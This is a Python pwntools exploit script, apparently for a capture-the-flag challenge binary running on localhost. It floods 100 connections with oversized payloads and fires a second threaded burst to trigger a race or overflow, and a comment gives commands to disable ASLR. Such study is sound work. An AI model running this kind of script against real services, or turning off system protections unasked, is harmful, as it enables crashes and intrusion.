from pwn import *
import IPython
import time
import sys
import threading

'''
# disable aslr
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# enable aslr
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
'''
local_bin = "./chal"
#libc = ELF("./libc-2.31.so")
elf = ELF(local_bin)
rop = ROP(elf)
context.log_level = 'debug'

# p = gdb.debug(local_bin, '''
#     set follow-fork-mode parent
#     continue
# 	''')

print(f"PORT = {sys.argv[1]}")
NUM_SOCK = 100

socks = []
for i in range(0, NUM_SOCK):
    p = remote("127.0.0.1", int(sys.argv[1]))
    socks.append(p)

def sla(sock,receive,reply):
    sock.sendlineafter(receive,reply,timeout=3)

def sa(sock,receive,reply):
    sock.sendafter(receive,reply)


'''
# Destroy message
b *0x5555555554C6 if $rsi != 0x21000

# Identify incoming
b *0x555555555751 if $eax != 0
'''
payload = b'A' * 0x21000

for i in range(0, NUM_SOCK):
    sla(socks[i], "What do you want to destroy", payload)

payload = b'C' * 0x20100
start_event = threading.Event()

# Thread function for sending the second payload
def send_payload(sock):
    start_event.wait()
    sla(sock, "Please leave also your name", payload)

# Creating threads for each socket
threads = []
for i in range(0, NUM_SOCK):
    t = threading.Thread(target=send_payload, args=(socks[i],))
    threads.append(t)

# Start all threads
for t in threads:
    t.start()

sleep(1)
start_event.set()

# Wait for all threads to finish
for t in threads:
    t.join()

# Sleep for any additional handling after sending
sleep(1)
for i in range(0, NUM_SOCK):
    socks[i].recv()
